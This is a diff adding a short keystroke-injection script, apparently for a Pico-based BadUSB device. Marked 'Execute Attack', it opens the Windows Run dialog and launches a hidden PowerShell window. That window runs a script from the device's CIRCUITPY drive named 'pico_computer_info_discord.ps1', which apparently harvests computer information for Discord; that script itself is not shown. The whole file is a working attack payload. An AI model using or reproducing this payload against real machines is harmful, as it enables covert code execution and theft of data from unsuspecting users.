@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 300
+REM Execute Attack
+STRING powershell -NoP -NonI -W Hidden ".((gwmi win32_volume -f 'label=''CIRCUITPY''').Name+'payloads\pico_computer_info_discord.ps1')"
+ENTER
+DELAY 1500
+
+
+
